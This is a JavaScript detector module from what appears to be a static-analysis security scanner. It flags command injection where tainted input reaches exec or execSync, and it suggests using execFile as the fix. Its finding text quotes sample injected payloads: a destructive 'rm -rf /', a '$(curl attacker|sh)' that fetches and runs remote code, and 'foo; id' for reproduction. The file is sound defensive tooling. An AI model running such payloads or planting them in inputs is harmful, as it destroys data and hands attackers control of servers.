"use strict";
// Command injection: tainted input reaches a shell-executing sink as part of a
// built command string. exec/execSync run through /bin/sh, so interpolation is
// directly exploitable.
const { loc, lineSpan, taintedNames, exprIsTainted, isRequestMember } = require("../parse");

const SHELL_SINKS = new Set(["exec", "execSync"]);

function sinkName(callee) {
  if (callee.type === "MemberExpression" && callee.property.type === "Identifier") return callee.property.name;
  if (callee.type === "Identifier") return callee.name;
  return null;
}

function isBuilt(node) {
  return node && ((node.type === "TemplateLiteral" && node.expressions.length) ||
    (node.type === "BinaryExpression" && node.operator === "+") ||
    node.type === "Identifier" || node.type === "MemberExpression");
}

function scan(unitFile, ast, h) {
  const { unit, rel, code } = unitFile;
  const findings = [];
  const taintCache = new WeakMap();

  h.traverse(ast, {
    CallExpression(path) {
      const name = sinkName(path.node.callee);
      if (!name || !SHELL_SINKS.has(name)) return;
      const arg = path.node.arguments[0];
      if (!isBuilt(arg)) return;

      const fnPath = path.getFunctionParent();
      let tainted = new Set();
      if (fnPath) {
        if (!taintCache.has(fnPath.node)) taintCache.set(fnPath.node, taintedNames(fnPath));
        tainted = taintCache.get(fnPath.node);
      }
      const confirmed = exprIsTainted(arg, tainted) || isRequestMember(arg);
      // a bare literal command is not injectable; require dynamic parts
      if (arg.type === "TemplateLiteral" && !arg.expressions.length) return;
      findings.push(build(unitFile, path.node, confirmed));
    },
  });
  return findings;
}

function build(unitFile, node, confirmed) {
  const { code, rel, unit } = unitFile;
  const span = lineSpan(code, node);
  return {
    detectorId: "commandInjection",
    class: "Command Injection",
    severity: "Critical",
    confirmedOverride: confirmed,
    unit,
    rel,
    ...loc(node),
    summary: "Tainted input reaches a shell-executing sink (exec/execSync)",
    attackerImpact:
      "An attacker injects shell metacharacters (`; rm -rf /`, `$(curl attacker|sh)`) to run arbitrary commands on the server with the app's privileges.",
    evidence: `${rel}:${loc(node).line} — dynamic command string passed to a shell sink`,
    remediation: {
      before: span.text,
      after:
        "// Use execFile with an argument array — no shell, no interpolation:\n" +
        "execFile('git', ['clone', repoUrl], cb);",
      contract:
        "execFile invokes the binary directly with argv, bypassing the shell. Same program runs with the same arguments for legitimate input; only shell metacharacter interpretation is removed. Output/complexity unchanged.",
    },
    proof: {
      kind: "repro",
      steps: [
        "Supply the tainted value as `foo; id` (or `$(id)`).",
        `exec at ${rel}:${loc(node).line} passes the built string to /bin/sh.`,
        "Observe the injected command executes alongside the intended one.",
      ],
    },
  };
}

module.exports = { id: "commandInjection", scan };
